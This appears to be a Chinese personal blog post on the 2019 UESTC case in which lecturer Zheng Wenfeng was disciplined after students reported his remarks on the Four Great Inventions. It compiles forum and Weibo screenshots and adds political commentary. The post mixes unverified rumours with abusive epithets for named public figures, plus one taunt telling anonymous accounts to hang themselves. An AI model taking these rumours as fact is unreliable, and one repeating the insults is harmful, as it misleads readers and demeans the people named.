<p>再次表示本人与郑老师没有交集，但是看这几个月知乎微博河畔上我电学生的评价，绝大部分说好，一些人说不好。我觉得这个郑老师应该属于这种很“事多”的老师，不然这种课水水就过去了，大家都轻松愉快，何必呢。（不认识郑老师，随便猜测）。当然还有种可能就是老师拿着鸡毛当令箭，私货很多，类似侯伦广，像这个回答说的那样： <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvNzk5NTc3NTAx">如何看待称「四大发明在世界上都不领先」高校老师因“师德失范”遭停课两年？ - 挤按睛明穴的回答 - 知乎<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827101306.png" alt="知乎回答" /> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvNzk4NDU2MDYw">如何看待称「四大发明在世界上都不领先」高校老师因「师德失范」遭停课两年？ - 朝经暮史的回答 - 知乎<i class="fa fa-external-link-alt"></i></span>里面一些早期负面评价截图 一个河畔回答，我看到好多人都说这门课全程录像，那不妨请学校把录像放出来我们看看 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827100038.png" alt="一个河畔回答" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FyY2hhZW9yYXB0b3IvaW1hZ2VfcmVzb3VyY2VzL0ltYWdlb2ZCbG9nLyVFNSU4QSU4OCVFNiU5RiVCNC5qcGc=">河畔小道消息<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="该课程问题驱动的创新创业">该课程（问题驱动的创新创业）</h3>
<p>俺们本科生也有这个课，算在核心通识的 研究生的不太了解，道听途说的情况： 0.5学分，开在研一下学期，选修，很多人公认的水课，据说很多人期末交个1000字的小论文就水过去了</p>
<p>但是郑老师要求15000字，貌似比较“事多” 至于怎么看待所谓的水课，这就是另一个问题了，这里不表 (更新，期末应该是8000字，10%查重，15000字是总计几次小论文合计字数)</p>
<p>更新，这是个人文交流月的课程，貌似上课时间只有一周 这样看来0.5学分、选修课，确实这么重的任务有些过分了 至于为什么有这种尴尬课程，这就要从李校长的“人文气息”说起（请各路明星和于丹、六老师这种货色），从李中堂"大众创业万众创新"说起（指坑韭菜的钱）</p>
<h3 id="电子科技大学师德建设委员会文件">电子科技大学师德建设委员会文件</h3>
<p>这个今天（2019.8.21）在微博等网站火起来的文件高斯模糊、来源不明，我暂时无法判定真假。</p>
<p>但是很多人人说那个师德建设委员会不存在，妹听说过，学校官网上查不到这么个机构；我只想说，善用搜索引擎啊同志们，这个是真实存在的，我就随手这么一谷歌，就找到了你电官网上的相关新闻，而且还看到了那个盖章的党委教师工作部，这么看红头文件可不太像是假的啊。 就是下面这个网址，谷歌搜索结果的第二名，赫然在列 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment3.PNG" alt="谷歌结果" /> <span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTY3MTE4">https://news.uestc.edu.cn/?n=UestcNews.Front.Document.ArticlePage&amp;Id=67118<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment2.PNG" alt="电子科技大学师德建设委员会" /> 点进去第一条： &gt;一、加强组织保障，完善工作机制 出台《电子科技大学师德师风建设实施办法》，构建学校党委统一领导、二级单位组织实施、教师主动参与的师德建设工作体系。组织成立学校师德建设工作委员会，负责师德建设工作总体规划；成立党委教师工作部，具体负责制度建设、组织落实、督导检查等工作。制定二级单位师德建设工作任务清单，明确二级单位党委师德建设职能职责，将师德师风建设纳入二级单位年度目标考核。强化教师自我教育，坚持将师德建设作为加强教师自身建设的重要内容，规定教师每年必须参加不少于2个学时的师德教育，并将学习情况纳入教师年度考核。</p>
<p>而我们打开另一条新闻<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTcyMzgy">学校举行第四期思政及师德师风培训班结业典礼暨师德师风建设专题会议<i class="fa fa-external-link-alt"></i></span>，还可以看到 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment4.PNG" alt="师德建设委员会" /> &gt;师德师风巡视员张开华、汤炎灿、徐全智、赵璧全、马立香、姜书艳，师德建设委员会成员单位负责人、312名培训学员，全体“青字号”人才，学院党委书记、学院分管教学、研究生、学生工作的副院长、副书记，全体教职工党支部书记、组织员，辅导员，学院教务科、研究生科工作人员等参加会议。教师发展中心主任罗小蓉主持会议。 &gt; 师德建设委员会成员赫然在列</p>
<p>这个知乎回答说的很好，文件不像是假的： &gt;作者：之乎者也 链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvNzk3NjYyMTI1">https://www.zhihu.com/question/341876584/answer/797662125<i class="fa fa-external-link-alt"></i></span> 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 一大波自认为专业的人从公文行文格式的角度分析这是份假文件，还说得头头是道。特别是 生之初尚无为 仁兄，竟然列出了行文错误之处达十条之多。就我在行政单位处理公文的经验来说，这百分百是份真文件，在校学生起个哄闹下事坑坑老师还行，要说造假水平还到不了这个层次。一、“XX单位文件”这是红头常用的版头，这种用法完全正确。二、关于文号，这是一份对内的文件，所以用“师德”二字完全正常，不是对外文件，不一定非要用“电科XX”开头。三、注意看年份外边是六角括号，这是公文发文年份的专用符号，不是专业人士都不知道这符号怎么输入，多半打成【】符号，这是很多假公文常犯的错误。四、关于文件序号，1号文，这个太正常不过了，师德方面本来事情就少，顶多开开会，哪用得着正式公文，所以七月份才发第一份文件很正常，发多了反倒是假文件了。另外常见公文编号错误就是把“1号”写成“第1号”，这份文件妥妥的避开这个坑。五、关于文件标题，“决定”是一个文种，关于XX的决定，就像关于XX的通知一样，一定是“的+文种”的格式，那些叫嚷“XX的处理决定”的可以洗洗睡了，还有说标题加个引号的，求您别不懂装懂误人子弟行不？六、落款师德建设委员会，盖教师工作部的章，还特别标明代章，就这严谨程度，是造假的娃娃们达不到的高度。师德委员会不是一个常设机构，没有专门的人员编制，没有印章很正常，而又要用它的名义出文件，那么就只好找个跟它工作相似的部门代章，这才是严谨的做法。要真造假，直接出个教师工作部的文件或者弄个师德委员会的章不是更好？知道代章的就如同前文所说知道六角符号的，这都是真正处理公文的专业人士。七、还有说字体错误的，拜托，标题二号小标宋，正文三号仿宋，这么正确的公文字体你还能找出错误？你没见low逼的假公文标题都用黑体么？知道在电脑上安装小标宋体字的都是半个专业人士。八、还有说这个处理决定应该由党委或者学校来出的，拜托，老郑他犯了哪条党纪国法了，就他那点破事，顶多也就一个言论不当，够不上大的处分，党委和学校那都是出警告、记过、降级、开除之类的处分决定。老郑这事儿吧，其实不严重，但是引起了大舆论，这就得处理了，既然事情不严重就不适合用党委或学校名义来处理，用师德委员会的名义刚刚好。基于以上，该问题所有关于文件真假的讨论就此终结。这份文件必定是真的，从公文格式讨论文件真假的同学，你们可以洗洗睡了。 &gt;</p>
<p>什么？为什么官网没有这个机构？对不起，我电行政的办事速度、我电网站的维护更新速度和土豆服务器我不想和你解释，我也不知道怎么解释,两天前就发生过下图这种事:</p>
<p><img width=350 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E9%97%A8%E6%88%B7.jpg"/></p>
<h3 id="如何看待知乎治校">如何看待知乎治校</h3>
<p>当然是支持啊，有人因为这个反对知乎治校，我就不明白，这事能怪到知乎治校头上啊？而且这此想搞大新闻的电卫兵可是活生生被骂上热搜的。知乎治校更有利于公正公开，也可以像这次一样让众人看清楚全过程，真有了事河畔狗管理真出了事第一时间删帖，邵振海张翼德宁宁都是河畔删帖空瓶查水表转战知乎才闹大的。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzY4MTEwODg0">知乎治校<i class="fa fa-external-link-alt"></i></span>我怎能不资瓷，<span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6eg==">电报治校<i class="fa fa-external-link-alt"></i></span>就更好辣 如何看待称「四大发明在世界上都不领先」高校老师因“师德失范”遭停课两年？ - 竹青的回答 - 知乎 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvODAxMzU3ODg1">https://www.zhihu.com/question/342049298/answer/801357885<i class="fa fa-external-link-alt"></i></span> &gt;<strong>“但凡学生有别的体面方法反抗，也不会采取这么复杂下作的方式，借助规则把事情做绝。”</strong>我就奇怪了，以往碰到这种问题，资乎主流的口径不应该是这样的么？而且我记得，通常资乎都是站在诸如学生这样的弱势群体一边的，大佬们都是无条件支持弱势者的反抗的。怎么？因为事关“文化自信”，这次都转而维护“师道尊严”了？学生的反抗呢？这次就被你们无视了？说到底这里批判学生的和给此类立场点赞的诸位，并不是真的想看到平等的师生关系，也不是真的支持弱者，只不过是屁股使然罢了。</p>
<p>这次微博上以奥老师为首的正能量学阀以及狗公知们张口闭口哭的那个惨啊，把老师描绘成了楚楚可怜的弱势群体，向我们展示了学阀的无耻嘴脸。国内硕导博导掌握生杀大权，欺压学生时没见某些狗跳出来这么激动。武汉爸爸大学那会微博上某些教授的嘴脸可不是这样啊，不仅不出来伸张正义，卖惨装死可在行了。到底还是屁股决定立场啊。 还有一些狗公知，监督政府时一口一个把权力关在笼子里，轮到自己了，满嘴自由；你们双标和上来就喷不是一天两天了，行为坦荡程度都不如境外轮子，和花公公周带鱼可真是势均力敌的对手。</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827111902.png" alt="如此厚颜无耻之徒" /> 颇有在Metoo那会鄢烈山刘瑜等一众老贼的嘴脸：Metoo运动too到公知圈，大喊Metoo是文革大字报民粹 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0Btb3JlbGVzcy/oo4XlpJblrr7nmoTliJjnkZwtYjk2MTJlNGMwMDdj">“何不食肉糜”的劉瑜——自由派公知的衰落<i class="fa fa-external-link-alt"></i></span>，<span class="exturl" data-url="aHR0cHM6Ly90aGVpbml0aXVtLmNvbS9hcnRpY2xlLzIwMTgwODA2LW5vdGVzLW1ldG9vLWxpdXl1Lw==">端传媒地址<i class="fa fa-external-link-alt"></i></span> 这里节选一段： &gt;刘瑜指责网上发声是文革式的大鸣大放贴大字报不走法律途径，且不说受害者网上发声要承受巨大压力，被人指责不检点不说，还要被人指责卖了还没达到目的所以出来指认。退一步讲，在中国走法律途径行得通吗，朱军一个小小case都被压制下来不许声张，她却以为中国真是法治国家，走法律途径可以得到公正的结果，类似于问“何不食肉糜”。 文革贴大字报跟此事有任何相似之处吗，按照邓式官方文革解读，贴大字报是冲击社会现有秩序，但是还有1978年发生的西单民主墙事件，那是公民自发的意见表达机会。 大鸣大放起始于1957年开始的帮党整风的运动，是“百家争鸣，百花齐放”的延伸。贴大字报在文革中比较盛行，也对各级大小官员有一定的约束作用。四大作为公民自由表达的基本权利被写进了1975年宪法。文革结束后也没有马上废止，还写进了1978年宪法。直到发生了西单民主墙，矛头直指最高领导人以后，于是到1980年被当局取消。人民有了自由表达的权利就会乱套，这是官方意识形态一贯的思路，网上表达就是贴大字报，从而导致社会乱套，这是一套非常荒谬的逻辑。刘瑜哥伦比亚政治学博士毕业，主攻方向就是文革，把大鸣大放大字报完全等同于暴民政治，显然不符合历史事实。 出身于省部级官员家庭的刘瑜可能一路顺风顺水没被人占过便宜，但是那也不应该站着说话不腰疼说穿着暴露活该被性侵。 公民个人表达就扣上一个民粹搞文革的帽子，煽动民粹带节奏的是官方公号，不是动不动就被封号禁言的个人帐号。可见刘瑜坚持的还是主流意识形态立场。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jaGluYWRpZ2l0YWx0aW1lcy5uZXQvY2hpbmVzZS8yMDE4LzA3L+iDoea2tW1hcnZpbu+8muWRiuWIq+WFrOefpeaXtuS7oy8=">胡涵Marvin：告别公知时代<i class="fa fa-external-link-alt"></i></span></p>
<p>什么时候能这样义，什么时候才有资格谈不要知乎治校，不要举报，不要贴大字报 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827112537.png" alt="我也很好奇" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvODAzNDY2NDEz">如何评价电子科技大学对于郑文锋老师做出的处理决定？ - 琅邪杨文理的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="教育部or你电">教育部or你电</h3>
<h4 id="是不是上面的意思">是不是上面的意思</h4>
<p>据小道消息，教育部的意思，学校是想保这个老师的没保住。 是学校干的还是教育部的意思，我倾向于是教育部的意思。我电，啊，这个大家也都知道，学校行政出了事从来都是偏袒老师的，说沆瀣一气也不为过。这个嘛，对比俺们学校之前张翼德邵振海宁宁的处理力度和其他老师与学生的小纠纷。再看看陈宝宝部长有关师德的讲话，俺觉得就是教育部干的，迫真（再次暴论） 因为知乎闹大半夜上了个热搜第一就对老师做出这种处罚，不可能，这不你电，这不大气大气，更何况知乎问题下面全是骂电卫兵支持老师，要按照舆情也因该是处罚学生</p>
<h4 id="谁之过">谁之过</h4>
<p>一群人就乱喷吧，也不看看某委员会委员长是谁，也不看看章上那镰刀锤子，能把锅扣在校长头上，校长确实咳咳咳，他一个致公党员可管不了党委和师德委员会的事，但也不能啥锅都往校长头上扣， 是吧，网络喷子们？ <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica.jpg" alt="这回不是云法官，这回是真律师" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica2.jpg" alt="不评价" /> 无中生蛆，反正这次我看到的护校蛆连微博协会拉皮条事件中的十分之一都不到（那又是什么事件？无可奉告，微博自己搜吧，古战场遗迹应该还在）。恁比女拳还会隔空打拳。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica3.jpg" alt="恁比女拳还会隔空打拳" /> 说起处分学生，甚至一堆大吼开除学生的，这时候就不言论自由、学术自由啦，这回就不处罚过重啦？还有一堆法律博主，恁依据哪条法律，哪条规定啊？这个时候不提什么合不合法辣，上图中律师连是不是那个女研究生干的都不还不确定呢，看到几张图捕风捉影，就开始骂辣，恁名字里还宪法呢。</p>
<h3 id="补充和后续">补充和后续</h3>
<p>郑老师的官网个人主页打不开了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/page1.PNG" alt="8.22日官网个人主页" /></p>
<blockquote>
<p>微博id@Kakyouin 6月15日，郑文锋问题被发到知乎。 6月24日《 电子科技大学教师师德失范行为处理办法（试行） 》通过，并于7月4日印发。 7月16日，电子科技大学根据7月4日印发的《办法》对郑文锋6月份的行为作出处理。 按这个溯及既往、加班上马的思路，世界上没什么解决不了的问题和解决不了的人。</p>
</blockquote>
<p>这样的话貌似涉及秋后算账，程序有问题</p>
<p>看来处罚应该七月那会就已经落实了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic6.jpg" alt="河畔小道消息" /></p>
<p>在8.22晚8至9点，万转千转的几篇微博评论区先后遭到和谐 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/byxf.jpg" alt="未经证实的消息" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic8.jpg" alt="疑似控评" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/tognhzhiwei.jpg" alt="补充" /></p>
<p>之前凤凰搜狐等几家媒体的评论区早早关闭 一天之前博主琉璃厂人质问是否是教育部指使的微博被删除 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E7%90%89%E7%92%83.jpg" alt="琉璃厂人" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E7%90%89%E7%92%832.jpg" alt="琉璃厂人" /></p>
<p>聊天记录中提到的书《中国的发明创造-古往今来话中国》：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzk5MjA3NTAw">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - skywear的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></p>
<p>聊天中提到的辩证法，我直接扔个链接吧<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG91YmFuLmNvbS9ncm91cC90b3BpYy84NTM0NzE2Lw==">https://www.douban.com/group/topic/8534716/<i class="fa fa-external-link-alt"></i></span></p>
<p>更新，河畔上知乎微博上好多将郑老师名字写成郑文峰的，包括上面截图里的童之伟老师博文，应该是“郑文锋”</p>
<p>更新，侠客岛，央视和光明日报的微信公众号评论了这一事件</p>
<p>更新，发现许多地方有一些三无小号跑出来疑似洗地，包括但不限于知乎微博河畔，请你们上大号 怂到用三无小号，不如自挂贫血楼 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvNzk3MzU5MjI0">https://www.zhihu.com/question/341876584/answer/797359224<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/washfloor2.PNG" alt="知乎上的" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/washfloor.PNG" alt="河畔上的" /></p>
<p>更新，河畔同学发帖称征集当事人接受采访 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/fazhiribao.png" alt="法制日报" /></p>
<p>更新，博主黄少卿在微博扬言抵制某电，转发过五千，被删除。暂时不知道自己隐藏的还是渣浪干的，他的六月之后的微博内容一下子全没了。河畔有人称该博主控评并删除其评论。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hsq.jpg" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hsq2-390x357.jpg" /> 某电表白墙开始怼黄某人，目前黄某人再次发了一条微博。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hjs.jpg" /> 恁这发个声明还要想几天，恁是树獭吗？开口就拒绝一切有关合作，郑老师也是电子科大的，他还有些商业创新项目，找你合作你要不要抵制？ 被怼了又重申“我尊重电子科大的每一位老师和每一位同学”，那几个你口中的红卫兵你尊不尊重？还重申，说的你好像之前尊重过一样。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/dddsx.jpg" alt="我佛辣" /> 跟个铁憨憨一样，真是，看看武汉爸爸大学那会当时一群人怎么抵制的：宣布从18年开始，如果武汉理工不道歉、不悔改、王攀不处理，高考报考武汉理工入学的学生不再录用。没有搞得已经在武理的学生为难，试图通过打击武理分数线来在不伤及无辜的情况下给校方施压。 武理当时冒着查水表危险广场写字的学生、放白花的学生，大家要是照宁这种抵制法抵制武理，怕是都要遭重，学生何辜？ 当初那个知乎问题可是被骂上热搜的，当时我目测成电学生及校友骂题主的超过95成，就是现在，河畔等地骂那几个研究生支持老师的怕是也超过9成。至于成电老师，你觉得会有老师喜欢举报？你上来就抵制，恁这做法比抵制日货还牛逼，简直战狼在世，就这恁还在微博当公知骂五毛喷抵制日货的愤青呢。反正恁逼逼两句自己也没损失，微博一片叫好，几千转发，一天涨粉几千，死道友不死贫道。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/dddsx.jpg" alt="我佛辣" /></p>
<p>更新，河畔有人发帖悬赏，目前赏金已经上千 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/capture.PNG" alt="悬赏帖子" /> 更新, 河畔上泥巴同学的消息 <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190906132928.png" alt="picture"/> <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190906132859.png" alt="picture"/></p>
<p>更新，我大概知道是什么事了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic10.jpg" alt="隐情" /> 那一年，20岁，事个学生 <img src="https://i.imgur.com/oA0Zc27.jpg?1" alt="小道消息" /> 那这样的话就更新到这里了，最后祝你，身体健康，再见。</p>
<h3 id="qa">Q&amp;A</h3>
<h4 id="大举报时代要来了">大举报时代要来了?</h4>
<p>早就来了,祝衮衮诸公，头颅安好，不上路灯</p>
<h4 id="文革红小兵要来了">文革红小兵要来了？</h4>
<p>兔区八组晋江粉红部分狗粉丝，早就来了，当然还有看上去特别正义的Metoo，是<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTUyMTM5MS9hbnN3ZXIvNDc3NDEwMTI0">举报污蔑重要推手<i class="fa fa-external-link-alt"></i></span>，不过，我觉得你们该担心的根本不是红小兵 <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/kaiser.jpg" alt="影帝离任讲话0.5倍速限定"/></p>
<h4 id="你怎么看">你怎么看</h4>
<p>我用手机看，当然写这篇博文时我正电脑前网上冲浪。</p>
<h4 id="如何看待核心通识成电讲坛之类的课程活动">如何看待核心通识、成电讲坛之类的课程活动</h4>
<p>画虎不成反类犬，我个人认为这和学院重组乱象一样，李言荣负有责任。 还有这几年的政策调整电赛折戟、robomaster实力不在，一个个连硬课都不敢选、怕影响成绩嫌性价比低不愿投入竞赛，已经影响了理工科学校的根基。 每次看到<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI4NjE2NzM4Mi9hbnN3ZXIvNDQ5Mjc3NDU3">蒋学长的回答<i class="fa fa-external-link-alt"></i></span>，就很唏嘘。 还有你电那个<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyNjU2MjExMy9hbnN3ZXIvNzE0MDMzNzk4">感人的实验报告<i class="fa fa-external-link-alt"></i></span>,大物实验我都不知道每次手抄好几页图个啥。 我不知道这样下去你电还是工程师的摇篮吗？<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ0NzY5OTcyL2Fuc3dlci8xMjk3NDYxMjM=">电子科大UESTC的教育存在什么问题？ - John.L的回答<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="如何评价创新课程">如何评价创新课程</h4>
<p>大众创业、万众创新之类的口号现在也和互联网+小黄车一样凉透了，一地鸡毛。我之前上课，听一位老教授说他当年在老交大上大学那会，大跃进就跟现在一样啊，发动学生搞发明，搞了很多稀奇古怪的玩意。跑题了，这里不提当年那些事了，回到现在，这种水也不是不水也不是的鸡肋课程，我觉得在全校范围来看弊大于利。</p>
<h4 id="如何评价陈宝生">如何评价陈宝生</h4>
<p>党棍，要向全国人民谢罪的，包括但不限于留学生超国民待遇，中小学减负， 2049年，教育部领导的中国教育即将正式将稳稳地立于世界教育中心（指开花</p>
<h4 id="如何看待各校成立师德委员会">如何看待各校成立师德委员会</h4>
<p>陈宝生的又一丰功伟绩，跟寻衅滋事一样变成口袋罪，还是武汉爸爸大学等一系列事件发生之后表的态，然而，大家都懂的...(说起来我当时在微博怼武汉爸爸大学还把平均转评过10的大号给炸了...) 引用一下今天童之伟博主的说法 &gt;电子科技大学师德建设委员会发布处罚郑文峰高工的这份文件缺乏正当根据，实际上是严重侵犯郑老师合法权利和自由的行为，应当尽快撤回。任何组织无权随意制定道德、执行道德、做道德裁判，法外剥夺公民受宪法保护的基本的权利和自由。郑老师作为一个科技工作者，有权就科技史上的问题发表不同于其他人的看法</p>
<h4 id="如何评价四大发明">如何评价四大发明</h4>
<p>“四大”是用来凑数的，为何不是三大，不是五大？欧洲古滕堡印刷术跟中国活字印刷没多大关系，甚至东亚古代也是雕版印刷为主。至于火药，俺觉得欧洲对于火药威力的改进和枪炮的改进贡献远大于东亚。 反正中医不太行，传武不太行，<span class="exturl" data-url="aHR0cHM6Ly94dy5xcS5jb20vaXBob25lL20vbGVnYWN5aW50b3VjaC80N2E3ZjJjMDMzODAxYTgxODUyNDNlNmNhOGRmNWZhZS5odG1s">四大名著<i class="fa fa-external-link-alt"></i></span>也是,课本里的地动仪和司南就更扯了</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlcGFwZXIuY24vbmV3c0RldGFpbF9mb3J3YXJkXzEzNTc0NDQ=">访谈︱江晓原：中国“四大发明”的争议从何而来<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="为何你电装死不出来回应">为何你电装死不出来回应</h4>
<p>这个，学校行政部门及领导可能还在放假哎，你看主楼好多办公室都没开门（手动滑稽） 难道学校不着急吗？这个可能还真不急，毕竟见得多了。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190826104258.png" alt="tgchannel" /> 另外指望师德委员会怎样怎样恐怕希望不大，你看委员长是谁，挡尾苏吉wyf哦（不用查了，约等于泥电一把手）</p>
<h3 id="详情参考">详情参考</h3>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NA==">知乎原问题<i class="fa fa-external-link-alt"></i></span> （已被隐藏） 其他相关问题 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTcyNjk5OS9hbnN3ZXJzL3VwZGF0ZWQ=">如何看待电子科技大学个别学生公然诱导舆论，构陷副教授郑文锋侮辱四大发明？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3MzU4Mzg2">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTc0NDU1MC9hbnN3ZXIvNzk2Njc4Mjc3">如何看待知乎热榜“如何看待电子科技大学副教授郑文锋公然侮辱四大发明”？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NA==">如何评价（疑似）电子科技大学对于郑文锋老师做出的处理决定？<i class="fa fa-external-link-alt"></i></span>、 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OA==">如何看待称「四大发明在世界上都不领先」高校老师因「师德失范」遭停课两年？<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9sb2c=">原问题的编辑记录<i class="fa fa-external-link-alt"></i></span> 可以看到电卫兵试图搞个大新闻时的最初提问内容，河畔搞事早已删除，时间久远，没有备份。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE5NDE4NzIw">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 红盾局长克里斯的回答 - 知乎<i class="fa fa-external-link-alt"></i></span> 一个暴躁师兄的回答，我对该研究生的态度基本同此。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3ODEzMzU2">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 知乎<i class="fa fa-external-link-alt"></i></span> 对于“公然侮辱”的评价，我的观点基本同此</li>
<li>成电新闻两则<br />
<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTcyMzgy">学校举行第四期思政及师德师风培训班结业典礼暨师德师风建设专题会议<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTY3MTE4">四川省教育厅网站报道我校师德师风建设工作<i class="fa fa-external-link-alt"></i></span> 可以看到是有这个电子科技大学师德建设委员会的</li>
<li>Oh CD ZZ 友情频道的相关报道<br />
<span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6ei8xMDA3">https://t.me/ohcdzz/1007<i class="fa fa-external-link-alt"></i></span> 、 <span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6ei84MjQ=">https://t.me/ohcdzz/824<i class="fa fa-external-link-alt"></i></span>等</li>
